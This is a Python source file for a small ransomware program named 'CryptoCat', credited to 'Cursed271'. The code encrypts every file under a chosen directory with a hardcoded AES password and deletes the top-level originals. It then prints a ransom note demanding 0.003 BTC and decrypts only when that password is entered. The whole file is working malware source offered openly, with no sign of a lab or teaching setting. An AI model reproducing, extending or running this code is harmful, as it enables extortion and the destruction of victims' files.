# ----- License ------------------------------------------- #

# CryptoCat Copyright (C) 2024 Steven Pereira
# This program comes with ABSOLUTELY NO WARRANTY.
# This is free software, and you are welcome to redistribute it under certain conditions.

# ----- Libraries -------------------------------------------------- #

import os
import pyAesCrypt
from rich.console import Console
import time

# ----- Global Declaration ----------------------------------------- #

console = Console()
directory = "" # Add the path to the folder you want to encrypt
password = "123456789"
bufferSize = 64 * 1024

# ----- Banner ----------------------------------------------------- #

def banner():
    console.print(rf"""[bold yellow]
┌──────────────────────────────────────────────────────────────────────────────────────┐
│                                                                                      │                                                                                
│     .d8888b.                            888             .d8888b.           888       │
│    d88P  Y88b                           888            d88P  Y88b          888       │
│    888    888                           888            888    888          888       │
│    888        888d888 888  888 88888b.  888888 .d88b.  888         8888b.  888888    │ 
│    888        888P"   888  888 888 "88b 888   d88""88b 888            "88b 888       │
│    888    888 888     888  888 888  888 888   888  888 888    888 .d888888 888       │
│    Y88b  d88P 888     Y88b 888 888 d88P Y88b. Y88..88P Y88b  d88P 888  888 Y88b.     │
│     "Y8888P"  888      "Y88888 88888P"   "Y888 "Y88P"   "Y8888P"  "Y888888  "Y888    │
│                            888 888                                                   │
│                       Y8b d88P 888                                                   │
│                        "Y88P"  888                                                   │ 
│                                                                                      │  
│                                        +-+-+                                         │    
│                                  [#c61a09]Made by Cursed271[bold yellow]                                   │
│                                        +-+-+                                         │
│                                                                                      │
└──────────────────────────────────────────────────────────────────────────────────────┘        
    """)

# ----- File Encryption -------------------------------------------- #

def encryption():
    for root, dirs, files in os.walk(directory):
        for file in files:
            filePath = os.path.join(root, file)
            pyAesCrypt.encryptFile(filePath, filePath + ".aes", password, bufferSize)
    files_in_directory = os.listdir(directory)
    filtered_files = [file for file in files_in_directory if not file.endswith(".aes")]
    for file in filtered_files:
        path_to_file = os.path.join(directory, file)
        os.remove(path_to_file)    

# ----- File Decryption -------------------------------------------- #

def decryption():
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith(".aes"):
                filepath = os.path.join(root, file)
                pyAesCrypt.decryptFile(filepath, filepath[:-4], password, bufferSize)
    files_in_directory = os.listdir(directory)
    filtered_files = [file for file in files_in_directory if file.endswith(".aes")]
    for file in filtered_files:
        path_to_file = os.path.join(directory, file)
        os.remove(path_to_file)

# ----- Menu ------------------------------------------------------- #

def unlock():
    console.print("[#0000ff]+--------------------------------------------------------------------------------------+")
    console.print("[#c61a09]+ All your files are now encrypted!")
    console.print("[#c61a09]+ Check your email to find a wallet address where you can deposit 0.003 BTC")
    console.print("[#c61a09]+ Once we receive the money, we'll share the password with you to unlock your files")
    console.print("[#0000ff]+--------------------------------------------------------------------------------------+")
    password2 = console.input("[white]+ Enter the password: ")
    if (password2 == password):
        console.print("[#0000ff]+--------------------------------------------------------------------------------------+")
        console.print("[#66ff00]+ Thank you for the payment!")
        time.sleep(2)
        decryption()
        console.print("[#66ff00]+ We have unlocked your files....")
        console.print("[#0000ff]+--------------------------------------------------------------------------------------+")
    else:
        console.print("[#0000ff]+--------------------------------------------------------------------------------------+")
        console.print("[#c61a09]+ You have entered the wrong password!")
        console.print("[#c61a09]+ All your files are corrupted....")
        console.print("[#0000ff]+--------------------------------------------------------------------------------------+")

# ----- Main Function ---------------------------------------------- #

if __name__=="__main__":
    banner()
    encryption()
    unlock()

# ----- End -------------------------------------------------------- #